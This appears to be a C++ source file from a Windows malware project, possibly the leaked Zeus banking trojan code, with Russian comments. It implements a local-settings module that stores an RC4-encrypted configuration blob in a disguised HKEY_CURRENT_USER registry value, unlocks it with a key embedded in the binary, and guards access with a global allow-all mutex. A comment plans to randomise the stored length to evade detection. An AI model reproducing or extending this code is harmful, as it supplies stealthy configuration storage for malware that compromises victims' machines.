#include <windows.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"
#include "localsettings.h"

#include "..\common\registry.h"
#include "..\common\sync.h"
#include "..\common\process.h"

static WCHAR registryKey[CORE_REGISTRY_KEY_BUFFER_SIZE];
static WCHAR registryValue[CORE_REGISTRY_VALUE_BUFFER_SIZE];
static WCHAR readWriteMutex[50];
static HANDLE lastReadWriteMutex;

static void initRegistry(void)
{
  
}

void LocalSettings::init(void)
{
  readWriteMutex[0] = 0;
  registryKey[0]    = 0;
}

void LocalSettings::uninit(void)
{

}

void LocalSettings::getCurrent(SETTINGS *settings)
{
  if(registryKey[0] == 0)Core::getRegistryValue(Core::RV_LOCALSETTINGS, registryKey, registryValue);
  
  bool r = false;
  DWORD type;
  void *data;
  DWORD size = Registry::_getValueAsBinaryEx(HKEY_CURRENT_USER, registryKey, registryValue, &type, &data);

  if(size != (DWORD)-1)
  {
    if(type == REG_BINARY && size >= sizeof(SETTINGS))
    {
      Mem::_copy(settings, data, sizeof(SETTINGS));

      //Снимаем шифрование.
      {
        PESETTINGS pes;
        Core::getPeSettings(&pes);
        Crypt::_rc4(settings, sizeof(SETTINGS), &pes.rc4Key);
      }

      r = true;
    }
    Mem::free(data);
  }
  
  if(r == false)Mem::_zero(settings, sizeof(SETTINGS));
}

bool LocalSettings::beginReadWrite(SETTINGS *settings)
{
  if(readWriteMutex[0] == 0)Core::generateObjectName(Core::OBJECT_ID_LOCALSETTINGS, readWriteMutex, MalwareTools::KON_GLOBAL);
  HANDLE mutex = Sync::_waitForMutex(&coreData.securityAttributes.saAllowAll, readWriteMutex);
  if(mutex != NULL)
  {
    lastReadWriteMutex = mutex;
    getCurrent(settings);
    return true;
  }
  return false;
}

bool LocalSettings::endReadWrite(SETTINGS *settings)
{
  bool r = false;
  if(settings != NULL && coreData.integrityLevel > Process::INTEGRITY_LOW)  
  {
    //Шифруем.
    {
      PESETTINGS pes;
      Core::getPeSettings(&pes);
      Crypt::_rc4(settings, sizeof(SETTINGS), &pes.rc4Key);
    }
    
    //Сохраняем.
    //FIXME: Рандомизировать длину.
    r = Registry::_setValueAsBinary(HKEY_CURRENT_USER, registryKey, registryValue, REG_BINARY, settings, sizeof(SETTINGS));
  }
  Sync::_freeMutex(lastReadWriteMutex);
  return r;
}
